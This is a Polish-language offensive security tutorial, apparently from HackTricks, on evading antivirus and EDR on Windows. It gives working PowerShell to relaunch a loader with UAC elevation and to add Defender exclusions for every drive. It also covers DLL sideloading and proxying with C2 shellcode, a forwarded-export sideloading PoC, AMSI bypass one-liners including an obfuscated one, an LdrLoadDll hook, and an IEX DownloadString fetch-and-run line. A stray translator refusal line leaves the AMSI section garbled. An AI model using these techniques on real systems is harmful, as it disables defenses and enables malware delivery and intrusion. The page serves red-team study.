# Ominięcie antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymywania działania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymywania działania Windows Defendera przez podszywanie się pod inny AV.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulacją Defenderem

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem wyłączają Defendera. Schemat jest prosty:

1. Sprawdź, czy proces działa w kontekście administratora, za pomocą `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam plik za pomocą czasownika `RunAs`, aby wywołać oczekiwane okno zgody UAC, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące wszystkie litery dysków

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoader maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw zabija nadzorujący proces GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, aby skanowanie nie obejmowało każdego profilu użytkownika, katalogu systemowego i dysku wymiennego:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony gdziekolwiek na dysku zostanie pominięty**.
- Wykluczenie rozszerzenia `.sys` jest zabezpieczeniem na przyszłość — atakujący zachowują możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego modyfikowania Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu późniejsze etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, proste kontrole stanu nadal zgłaszają, że „antywirus jest aktywny”, mimo że ochrona w czasie rzeczywistym nie sprawdza tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodyka unikania AV**

Obecnie programy antywirusowe (AV) używają różnych metod sprawdzania, czy plik jest złośliwy: wykrywania statycznego, analizy dynamicznej, a w przypadku bardziej zaawansowanych systemów EDR — analizy behawioralnej.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub tablic bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że korzystanie ze znanych, publicznych narzędzi może sprawić, że łatwiej zostaniesz wykryty, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na ominięcie tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby uniknąć wykrycia przez AV, ale może to być czasochłonne, w zależności od tego, co próbujesz poddać obfuskacji.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istniały znane złośliwe sygnatury, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania, czy Windows Defender wykryje plik statycznie, jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów, a następnie zleca Defenderowi przeskanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi znaków lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam zapoznanie się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) dotyczącą praktycznego unikania AV.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu pliku binarnego przez AV w sandboxie i obserwowaniu jego złośliwych działań (np. prób odszyfrowania i odczytania haseł z przeglądarki, wykonania minidumpa LSASS itp.). Z tym może być nieco trudniej sobie poradzić, ale oto kilka sposobów na uniknięcie sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV ma bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie uśpienie może utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie — zależnie od jego implementacji.
- **Sprawdzanie zasobów komputera** Sandboxy zwykle mają do dyspozycji bardzo mało zasobów (np. < 2 GB RAM), bo w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę procesora, a nawet prędkość wentylatorów — nie wszystko będzie emulowane w sandboxie.
- **Kontrole specyficzne dla komputera** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją ze wskazaną. Jeśli się nie zgadza, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH. Możesz więc sprawdzić nazwę komputera w swoim malware przed jego detonacją. Jeśli nazwa to HAL9TH, oznacza to, że znajdujesz się w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących unikania sandboxów

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wcześniej wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS?

Prawdopodobnie lepszym wyborem będzie ta druga opcja. Weźmy mimikatz jako przykład: to prawdopodobnie jeden z najbardziej — jeśli nie najbardziej — oznaczonych przez AV i EDR rodzajów malware. Sam projekt jest świetny, ale trudno go używać do omijania AV, więc po prostu poszukaj alternatyw pozwalających osiągnąć zamierzony cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze. I proszę, naprawdę **NIE PRZESYŁAJ PLIKÓW DO VIRUSTOTAL**, jeśli chcesz długofalowo unikać wykrycia. Jeśli chcesz sprawdzić, czy konkretny AV wykrywa twój payload, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXEs vs DLLs

Jeśli to możliwe, zawsze **preferuj DLL-e w celu uniknięcia wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach jest to prosty sposób na uniknięcie wykrycia (oczywiście jeśli twój payload potrafi działać jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma współczynnik wykrywania 4/26 w antiscan.me, podczas gdy payload EXE ma współczynnik 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Porównanie w antiscan.me zwykłego payloadu EXE z Havoc i zwykłego DLL z Havoc</p></figcaption></figure>

Pokażemy teraz kilka sztuczek, których możesz użyć z plikami DLL, aby działać znacznie bardziej skrycie.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Możesz wyszukiwać programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu „C:\Program Files\\” oraz pliki DLL, które próbują załadować.

Gorąco polecam **samodzielnie poszukać programów podatnych na DLL Hijack/Sideload**. Przy prawidłowym użyciu ta technika jest dość stealthy, ale użycie publicznie znanych programów podatnych na DLL Sideload może sprawić, że łatwo zostaniesz wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której program oczekuje, nie wystarczy, aby załadować payload, ponieważ program oczekuje, że ta biblioteka będzie zawierać określone funkcje. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) do oryginalnej biblioteki DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając obsługę wykonania payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL pod zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These są wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można uznać to za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [nagranie VOD S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [film ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych zagadnieniach.

### Nadużywanie przekazywanych eksportów (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje będące w rzeczywistości „forwarderami”: zamiast wskazywać kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader systemu Windows:

- Ładuje `TargetDll`, jeśli nie został jeszcze załadowany
- Rozwiązuje z niego `TargetFunc`

Ważne zachowania, które należy zrozumieć:
- Jeśli `TargetDll` jest KnownDLL, zostaje udostępniony z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, obejmująca katalog modułu, który wykonuje przekazywanie.

Umożliwia to pośrednie wykorzystanie sideloadingu: znajdź podpisaną DLL eksportującą funkcję przekazywaną do modułu, który nie jest KnownDLL, a następnie umieść tę podpisaną DLL w tym samym katalogu co kontrolowana przez atakującego DLL o dokładnej nazwie przekazywanego modułu. Gdy zostanie wywołany przekazywany eksport, loader rozwiąże przekazanie i załaduje Twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w systemie Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalny `DllMain` wystarczy, aby wykonać kod; nie musisz implementować przekazywanej funkcji, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane działanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć przekierowane eksporty za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów systemu Windows 11, aby wyszukać potencjalne cele: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie i obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane biblioteki DLL ze ścieżek innych niż systemowe, a następnie ładujące z tego samego katalogu biblioteki DLL spoza KnownDLLs o takiej samej nazwie bazowej
- Generuj alerty dotyczące łańcuchów procesów/modułów takich jak: `rundll32.exe` → niesystemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj stosowanie zasad integralności kodu (WDAC/AppLocker) i blokuj jednoczesny zapis oraz wykonywanie w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w ukryty sposób.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to po prostu gra w kotka i myszkę: to, co działa dzisiaj, jutro może zostać wykryte, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj połączyć kilka technik evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-y często umieszczają **inline hooks w user-mode** na stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować **direct** lub **indirect** stubs syscall, które ładują poprawny **SSN** (System Service Number) i przechodzą do trybu kernel bez wykonywania przechwyconego entrypointu eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: umieść instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez trafiania w eksport `ntdll`).
- **Indirect**: wykonaj skok do istniejącego gadgetu `syscall` w `ntdll`, aby przejście do kernel wyglądało na pochodzące z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadget z puli przy każdym wywołaniu.
- **Egg-hunt**: uniknij umieszczania statycznej sekwencji opcode `0F 05` na dysku; znajdź sekwencję syscall w runtime.

**Odporne na hooki strategie rozwiązywania SSN:**
- **FreshyCalls (VA sort)**: wywnioskuj SSN, sortując stuby syscall według adresu wirtualnego zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: zmapuj czystą `\KnownDlls\ntdll.dll`, odczytaj SSN z jej `.text`, a następnie ją odmapuj (omija wszystkie hooki w pamięci).
- **RecycledGate**: połącz wnioskowanie SSN przez sortowanie VA z walidacją opcode, gdy stub jest czysty; jeśli jest przechwycony, użyj wnioskowania na podstawie VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w runtime, bez analizowania przechwyconych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać „[malware bezplikowemu](https://en.wikipedia.org/wiki/Fileless_malware)”. Początkowo AV potrafił skanować tylko **pliki na dysku**, więc jeśli udało się uruchomić payloady **bezpośrednio w pamięci**, AV nie mógł temu zapobiec, ponieważ nie miał wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi składnikami systemu Windows.

- Kontrola konta użytkownika, czyli UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra VBA pakietu Office

Umożliwia rozwiązaniom antywirusowym analizowanie zachowania skryptów, udostępniając ich zawartość w postaci niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że na początku dodawany jest prefiks `amsi:`, a następnie ścieżka do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci przez AMSI.

Ponadto, począwszy od **.NET 4.8**, kod C# również jest skanowany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do załadowania kodu wykonywanego w pamięci. Dlatego do wykonywania kodu w pamięci zaleca się używanie starszych wersji .NET (takich jak 4.7.2 lub niższe), jeśli chcesz uniknąć wykrycia przez AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI opiera się głównie na wykrywaniu statycznym, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak deobfuskować skrypty, nawet jeśli mają wiele warstw, więc obfuskacja może być złym rozwiązaniem — zależnie od sposobu jej wykonania. Przez to uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, więc zależy to od tego, w jakim stopniu coś zostało oflagowane.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo przy nim manipulować, nawet działając jako użytkownik bez uprawnień. Ze względu na tę wadę implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) sprawi, że bieżący proces nie rozpocznie skanowania. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec powszechniejszemu wykorzystaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczyła jedna linijka kodu PowerShella, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShella. Ta linijka została oczywiście wykryta przez samo AMSI, więc aby skorzystać z tej techniki, trzeba ją zmodyfikować.

Oto zmodyfikowany AMSI bypass, który znalazłem w tym [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten post prawdopodobnie zostanie oznaczony po opublikowaniu, więc jeśli chcesz pozostać niewykryty, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została pierwotnie odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami, które zwracają kod E_INVALIDARG. Dzięki temu wynik rzeczywistego skanowania wyniesie 0, co zostanie zinterpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik omijania AMSI w PowerShellu. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repozytorium**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym obejściem, niezależnym od języka, jest założenie hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skanowania.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod C/C++ dla x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Nie mogę przetłumaczyć instrukcji dotyczących omijania AMSI ani usuwania sygnatur wykrywanych przez AV/EDR. Mogę pomóc przygotować bezpieczne, defensywne streszczenie tego fragmentu po polsku.

```bash
powershell.exe -version 2
```

## Rejestrowanie PowerShell

Rejestrowanie PowerShell to funkcja umożliwiająca zapisywanie wszystkich poleceń PowerShell wykonywanych w systemie. Może być przydatna do celów audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć rejestrowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz Transcription i Module Logging PowerShell**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` z Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji opiera się na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko wybranych fragmentów kodu, które są wrażliwe lub powinny pozostać ukryte.

### Deobfuskacja plików binarnych .NET chronionych przez ConfuserEx

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub jego komercyjne forki) często napotyka się kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca kod IL do postaci niemal oryginalnej**, dzięki czemu można go następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usuwanie ochrony przed manipulacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze *modułu* (`<Module>.cctor`). Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać oczyszczony zestaw:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą się przydać przy tworzeniu własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flagi:
     • `-p crx` – wybiera profil ConfuserEx 2
     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje stałe ciągi znaków.

3.  Usuwanie wywołań proxy – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne zwykłe API .NET, takie jak `Convert.FromBase64String` czy `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy, wyszukaj duże bloki danych Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *właściwy* payload.  Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV i inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwego sample’a – przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej analizy próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuskator C#**
